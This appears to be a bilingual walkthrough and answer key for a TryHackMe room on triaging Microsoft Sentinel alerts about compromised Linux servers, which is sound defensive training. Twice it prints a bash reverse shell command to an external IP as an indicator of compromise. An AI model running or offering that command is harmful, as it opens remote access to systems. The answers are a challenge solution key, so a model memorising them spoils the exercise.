# Tinsel Triage (SOC Alert Triaging)

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|---|---|---|---|---|---|---|---|
| Medium | walkthrough | `azuresentinel-aoc2025-a7d3h9k0p2` | [TryHackMe - Tinsel Triage (SOC Alert Triaging)](https://tryhackme.com/room/azuresentinel-aoc2025-a7d3h9k0p2) | Advent of Cyber 2025 | THM | Microsoft Sentinel, Azure Security, SOAR, alert triage | Clasificación y triage de alertas de seguridad en entorno cloud |

---

**Contexto:** Microsoft Sentinel es una plataforma SIEM/SOAR en Azure que permite detectar, clasificar y responder a alertas de seguridad. En esta práctica se analizan múltiples alertas de compromiso de sistemas Linux dentro de un entorno empresarial navideño, priorizando la respuesta ante amenazas reales.

> **ES:** Práctica de triage de alertas con Microsoft Sentinel: se clasifican alertas de compromiso en sistemas Linux y se prioriza la respuesta ante amenazas reales.
> **EN:** Alert triage practice with Microsoft Sentinel: security alerts on Linux systems are classified and response is prioritized against real threats.

## Solucionario

### Task 1: Alert Triage

**Explicación:** Triaje de las alertas generadas por Microsoft Sentinel para clasificarlas por severidad, entidades afectadas y usuarios involucrados.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | How many entities are affected by the Linux PrivEsc - Polkit Exploit Attempt alert? | `10` |
| 2 | What is the severity of the Linux PrivEsc - Sudo Shadow Access alert? | `High` |
| 3 | How many accounts were added to the sudoers group in the Linux PrivEsc - User Added to Sudo Group alert? | `4` |

### Task 2: Investigación de sistemas comprometidos

**Explicación:** Investigación de los sistemas comprometidos para identificar módulos de kernel maliciosos y comandos sospechosos ejecutados por usuarios legítimos.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 4 | What is the name of the kernel module installed in websrv-01? | `malicious_mod.ko` |
| 5 | What is the unusual command executed within websrv-01 by the ops user? | `/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1` |

### Task 3: Análisis de acceso y persistencia

**Explicación:** Análisis de accesos SSH sospechosos y de la persistencia establecida mediante la adición de usuarios al grupo sudoers.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 6 | What is the source IP address of the first successful SSH login to storage-01? | `172.16.0.12` |
| 7 | What is the external source IP that successfully logged in as root to app-01? | `203.0.113.45` |
| 8 | Aside from the backup user, what is the name of the user added to the sudoers group inside app-01? | `deploy` |

### Tabla unificada de preguntas / Unified Q&A

| # | Pregunta / Question | Respuesta / Answer |
|---|---|---|
| 1 | How many entities are affected by the Linux PrivEsc - Polkit Exploit Attempt alert? | `10` |
| 2 | What is the severity of the Linux PrivEsc - Sudo Shadow Access alert? | `High` |
| 3 | How many accounts were added to the sudoers group in the Linux PrivEsc - User Added to Sudo Group alert? | `4` |
| 4 | What is the name of the kernel module installed in websrv-01? | `malicious_mod.ko` |
| 5 | What is the unusual command executed within websrv-01 by the ops user? | `/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1` |
| 6 | What is the source IP address of the first successful SSH login to storage-01? | `172.16.0.12` |
| 7 | What is the external source IP that successfully logged in as root to app-01? | `203.0.113.45` |
| 8 | Aside from the backup user, what is the name of the user added to the sudoers group inside app-01? | `deploy` |

---

**Metodología:** Se utilizó Microsoft Sentinel para clasificar alertas de seguridad por severidad y afectación. Se rastrearon indicadores de compromiso (IoCs) como módulos de kernel maliciosos, comandos de reverse shell, y accesos SSH sospechosos. Se correlacionaron las alertas para identificar el alcance real del compromiso.

### Cadena de ataque / Attack Chain

1. Generación de alertas en Microsoft Sentinel tras el compromiso de sistemas Linux.
2. Triaje inicial: severidad, entidades afectadas y grupos implicados.
3. Instalación de un módulo de kernel malicioso (`malicious_mod.ko`) en websrv-01.
4. Ejecución de una reverse shell por el usuario `ops`.
5. Accesos SSH no autorizados desde `172.16.0.12` y `203.0.113.45`.
6. Persistencia: adición de usuarios al grupo sudoers en app-01.

**Learning chain:** SIEM/SOAR → alert triage → IoC correlation → privilege escalation analysis → persistence detection

**Lección:** *El triage de alertas exige correlacionar severidad, entidades e IoCs: los módulos de kernel maliciosos, las reverse shells y los accesos SSH no autorizados revelan el alcance completo del compromiso.*

**MITRE ATT&CK:** T1053.003 - Scheduled Task/Job: Cron, T1547.006 - Boot or Logon Autostart Execution: Kernel Modules and Extensions, T1078.004 - Valid Accounts: Cloud Accounts

**Fuente:** [TryHackMe - Tinsel Triage (SOC Alert Triaging)](https://tryhackme.com/room/azuresentinel-aoc2025-a7d3h9k0p2)

---

## Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.